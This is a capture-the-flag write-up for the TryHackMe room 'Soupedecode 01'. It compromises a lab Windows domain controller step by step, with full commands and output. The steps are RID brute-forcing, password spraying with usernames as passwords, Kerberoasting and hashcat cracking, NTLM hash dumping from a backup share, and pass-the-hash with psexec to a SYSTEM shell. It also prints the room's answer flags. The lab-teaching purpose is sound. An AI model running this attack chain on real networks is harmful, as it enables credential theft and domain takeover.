# <div align='center'>[Soupedecode 01](https://tryhackme.com/room/soupedecode01)</div>
<div align='center'>Test your enumeration skills on this boot-to-root machine.</div>
<div align='center'>
  <img width="200" height="200" alt="xuper" src="https://github.com/user-attachments/assets/659ba37a-4640-4007-81fc-e6b11f6a7e2a" />
</div>

## Task 1. Soupedecode 01

Soupedecode is an intense and engaging challenge in which players must compromise a domain controller by exploiting Kerberos authentication, navigating through SMB shares, performing password spraying, and utilizing Pass-the-Hash techniques. Prepare to test your skills and strategies in this multifaceted cyber security adventure.

### What is the user flag?
```
28189316c25dd3c0ad56d44d000d62a8
```
### What is the root flag?
```
27cb2be302c388d63d27c86bfdd5f56a
```

## Initial Enumeration
I began with an Nmap scan to identify open services and potential attack surfaces.
```
$ nmap -sV -sC -Pn 10.201.91.100
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-08-28 12:47:44Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: SOUPEDECODE.LOCAL0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
|_ssl-date: 2025-08-28T12:48:40+00:00; -1s from scanner time.
| ssl-cert: Subject: commonName=DC01.SOUPEDECODE.LOCAL
| rdp-ntlm-info: 
|   Target_Name: SOUPEDECODE
|   NetBIOS_Domain_Name: SOUPEDECODE
|   NetBIOS_Computer_Name: DC01
|   DNS_Domain_Name: SOUPEDECODE.LOCAL
|   DNS_Computer_Name: DC01.SOUPEDECODE.LOCAL
|   DNS_Tree_Name: SOUPEDECODE.LOCAL
|   Product_Version: 10.0.20348
|_  System_Time: 2025-08-28T12:48:01+00:00
```
The scan revealed multiple services commonly associated with a Windows Domain Controller:
* **DNS** is open on port `53`
* **Kerberos** is open on port `88`
* **LDAP** is open on ports `389 & 3268`
* **SMB** is open on port `445`
* **RDP** is open on port `3389`

Notably, the system exposed the domain name: **SOUPEDECODE.LOCAL.**


## SMB Share Enumeration
With SMB (445/tcp) open, my next step was to check if the guest user had access to any shares. I ran CrackMapExec with an empty password:
```
crackmapexec smb 10.201.91.100 -u 'guest' -p '' --shares
SMB         10.201.91.100   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.201.91.100   445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB         10.201.91.100   445    DC01             [*] Enumerated shares
SMB         10.201.91.100   445    DC01             Share           Permissions     Remark
SMB         10.201.91.100   445    DC01             -----           -----------     ------
SMB         10.201.91.100   445    DC01             ADMIN$                          Remote Admin
SMB         10.201.91.100   445    DC01             backup                          
SMB         10.201.91.100   445    DC01             C$                              Default share
SMB         10.201.91.100   445    DC01             IPC$            READ            Remote IPC
SMB         10.201.91.100   445    DC01             NETLOGON                        Logon server share 
SMB         10.201.91.100   445    DC01             SYSVOL                          Logon server share 
SMB         10.201.91.100   445    DC01             Users
```
The results showed that authentication as guest was possible, and I could enumerate available shares:
* IPC$ → Read access (Remote IPC)
* ADMIN$, C$ → Default administrative shares
* NETLOGON & SYSVOL → Standard AD logon shares
* Users → Standard user profiles
* Backup → A non-standard share, though not accessible to the guest account

This immediately stood out because unusual shares (like backup) often hide sensitive information such as credentials or configuration files.

## Attempting LDAP Enumeration
After identifying LDAP services (389/tcp and 3268/tcp), I attempted to enumerate users with CrackMapExec:
```
crackmapexec ldap 10.201.91.100 -u "guest" -p "" --users
SMB         10.201.91.100   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
LDAP        10.201.91.100   445    DC01             [-] SOUPEDECODE.LOCAL\guest: Error connecting to the domain, are you sure LDAP service is running on the target?
Error: [Errno Connection error (DC01.SOUPEDECODE.LOCAL:389)] [Errno -3] Temporary failure in name resolution
Unfortunately, the query failed with a temporary name resolution error, suggesting the domain controller requires proper DNS resolution (pointing to DC01.SOUPEDECODE.LOCAL) before LDAP enumeration will succeed.
RID Brute Force User Enumeration
Since LDAP failed, I switched to RID brute forcing with CrackMapExec to enumerate valid users and groups:
crackmapexec smb 10.201.91.100 -u 'guest' -p '' --rid-brute
SMB         10.201.91.100   445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.201.91.100   445    DC01             [+] SOUPEDECODE.LOCAL\guest: 
SMB         10.201.91.100   445    DC01             498: SOUPEDECODE\Enterprise Read-only Domain Controllers (SidTypeGroup)
SMB         10.201.91.100   445    DC01             500: SOUPEDECODE\Administrator (SidTypeUser)
SMB         10.201.91.100   445    DC01             501: SOUPEDECODE\Guest (SidTypeUser)
SMB         10.201.91.100   445    DC01             502: SOUPEDECODE\krbtgt (SidTypeUser)
SMB         10.201.91.100   445    DC01             512: SOUPEDECODE\Domain Admins (SidTypeGroup)
SMB         10.201.91.100   445    DC01             513: SOUPEDECODE\Domain Users (SidTypeGroup)
SMB         10.201.91.100   445    DC01             514: SOUPEDECODE\Domain Guests (SidTypeGroup)
```
This method was successful, and it returned a large list of domain users and groups.

## Exporting Users to a File
To handle the volume of results, I used awk to extract usernames into a dedicated wordlist:
```
crackmapexec smb 10.201.91.100 -u 'guest' -p '' --rid-brute | awk '{split($6,a,"\\"); print a[2]}' > users.txt
```
This created a users.txt file containing all the enumerated usernames for further testing.

## Checking for Weak Credentials
Next, I checked if any users had their username set as the password A common misconfiguration. CrackMapExec makes this easy:
```
crackmapexec smb 10.201.91.100 -u users.txt -p users.txt --no-bruteforce --continue-on-success
```
This command tests username=password logins, and I found at least one valid account using this weak setup.
This quickly revealed valid credentials:
```
[+] SOUPEDECODE.LOCAL\ybob317 : ybob317
```

## Enumerating SMB Shares with Valid Credentials
With the discovered credentials, I enumerated accessible SMB shares:
```
crackmapexec smb 10.201.91.100 -u 'ybob317' -p 'ybob317' --shares

SMB  10.201.91.100   445    DC01    [*] Windows 10.0 Build 20348 x64 (domain:SOUPEDECODE.LOCAL)
SMB  10.201.91.100   445    DC01    [+] SOUPEDECODE.LOCAL\ybob317:ybob317
SMB  10.201.91.100   445    DC01    [*] Enumerated shares
SMB  10.201.91.100   445    DC01    Share           Permissions   Remark
SMB  10.201.91.100   445    DC01    -----           -----------   ------
SMB  10.201.91.100   445    DC01    ADMIN$                        
SMB  10.201.91.100   445    DC01    backup                        
SMB  10.201.91.100   445    DC01    C$                            
SMB  10.201.91.100   445    DC01    IPC$            READ          
SMB  10.201.91.100   445    DC01    NETLOGON        READ          
SMB  10.201.91.100   445    DC01    SYSVOL          READ          
SMB  10.201.91.100   445    DC01    Users           READ
```
The Users share was readable, which is usually where user directories and potential flags are stored.

## Accessing the Users Share with Impacket
Since my original VM expired, I spun up another machine with a new IP and used Impacket's SMB client to connect:
```
python3 examples/smbclient.py 10.201.1.205/ybob317:ybob317@10.201.1.205
```

After successful login, I listed available shares:
<img width="969" height="312" alt="image" src="https://github.com/user-attachments/assets/f13b8f8a-7753-4486-a282-b605c4197995" />

I mounted the `Users` share and listed its contents:

<img width="616" height="291" alt="image" src="https://github.com/user-attachments/assets/ad779cc5-65a3-44ce-9adf-92a5b093da1e" />


## Navigating to the User Directory
<img width="724" height="742" alt="image" src="https://github.com/user-attachments/assets/c8b0d213-e04b-48f4-af8b-15e9a26a2fca" />

## User Flag
The user flag is typically located in the Desktop directory. I navigated there to retrieve it:
```
# cd Desktop
# ls
drw-rw-rw-          0  Fri Jul 25 23:21:44 2025 .
drw-rw-rw-          0  Mon Jun 17 22:54:32 2024 ..
-rw-rw-rw-        282  Mon Jun 17 22:54:32 2024 desktop.ini
-rw-rw-rw-         33  Fri Jul 25 23:21:44 2025 user.txt
# cat user.txt
28189316c25dd3c0ad56d44d000d62a8
```

## Enumerating SPNs for Kerberoasting

SPNs identify services in Active Directory. Misconfigured service accounts let us request Kerberos tickets and extract offline-crackable hashes — a technique called **Kerberoasting**.

I ran **Impacket’s GetUserSPNs.py** with my valid credentials:

```bash
python3 examples/GetUserSPNs.py SOUPEDECODE.LOCAL/ybob317:ybob317 -dc-ip 10.201.1.205 -request -output hash.txt
```

## Cracking Kerberoasted Hashes

With the SPN hashes saved in `hash.txt`, I moved on to cracking them using **Hashcat** with the `rockyou.txt` wordlist:

```bash
hashcat hash.txt wordlists/rockyou.txt --show
```

Hashcat auto-detected the format as **Kerberos 5 TGS-REP (mode 13100)** and successfully cracked one of the hashes:

```
$krb5tgs$23$*file_svc$SOUPEDECODE.LOCAL/file_svc*...
Password123!!
```

This revealed valid credentials:

```
SOUPEDECODE.LOCAL\file_svc : Password123!!
```

##  Accessing the Backup Share

Next, I tested these credentials against SMB shares:

```bash
crackmapexec smb 10.201.1.205 -u "file_svc" -p 'Password123!!' --shares
```

The result confirmed that `file_svc` had **read access to the `backup` share**:

```
Share      Permissions  
-----      -----------  
backup     READ
```
## Looting the Backup Share

I connected to the share using Impacket’s smbclient.py:
```
python3 examples/smbclient.py 10.201.1.205/file_svc:'Password123!!'@10.201.1.205
```

Once inside, I navigated to the backup share and found a single interesting file:

<img width="1057" height="419" alt="image" src="https://github.com/user-attachments/assets/d0b709c5-e5f6-4d22-ab8a-189d425dfa1e" />

I downloaded it:
```
get backup_extract.txt
```
Opening this file revealed a large dump of hashes, which will be the next target for cracking and potential privilege escalation.

## Cracking Backup Hashes → Gaining Access

With the dumped hashes from `backup_extract.txt`, I prepared two wordlists: one with usernames and another with NTLM hashes.

```bash
cat backup_extract.txt | awk -F\: '{ print $4}' > hashes.txt
cat backup_extract.txt | awk -F\: '{ print $1}' > users_hashes.txt
```

Next, I used **CrackMapExec** to test username–hash pairs across SMB:

```bash
crackmapexec smb 10.201.1.205 -u users_hashes.txt -H hashes.txt --no-bruteforce
```

The output showed several login failures, but one stood out:

```
$ crackmapexec smb 10.201.1.205 -u users_hashes.txt -H hashes.txt  --no-bruteforce
SMB         10.201.1.205    445    DC01             [*] Windows 10.0 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.201.1.205    445    DC01             [-] SOUPEDECODE.LOCAL\WebServer$:c47b45f5d4df5a494bd19f13e14f7902 STATUS_LOGON_FAILURE 
SMB         10.201.1.205    445    DC01             [-] SOUPEDECODE.LOCAL\DatabaseServer$:406b424c7b483a42458bf6f545c936f7 STATUS_LOGON_FAILURE 
SMB         10.201.1.205    445    DC01             [-] SOUPEDECODE.LOCAL\CitrixServer$:48fc7eca9af236d7849273990f6c5117 STATUS_LOGON_FAILURE 
SMB         10.201.1.205    445    DC01             [+] SOUPEDECODE.LOCAL\FileServer$:e41da7e79a4c76dbd9cf79d1cb325559 (Pwn3d!)
```

## Gaining Remote Access with Impacket PsExec

Since I already had the **NTLM hash of a privileged account**, the next step was to turn it into a remote shell. Impacket’s `psexec.py` makes this straightforward by authenticating with hashes instead of plaintext credentials.

```bash
python3 impacket/examples/psexec.py 'soupedecode.local/FileServer$'@10.201.1.205 \
-hashes 'aad3b435b51404eeaad3b435b51404ee:e41da7e79a4c76dbd9cf79d1cb325559'
```

The tool uploaded a service binary, executed it, and dropped me directly into a **SYSTEM-level shell** on the domain controller:

## Root flag.txt
```cmd
cd C:\Users\Administrator\Desktop
type root.txt
```
<img width="560" height="157" alt="image" src="https://github.com/user-attachments/assets/5835451a-0c66-4599-bc65-aa522c0d4c0b" />

**Domain compromise achieved!**
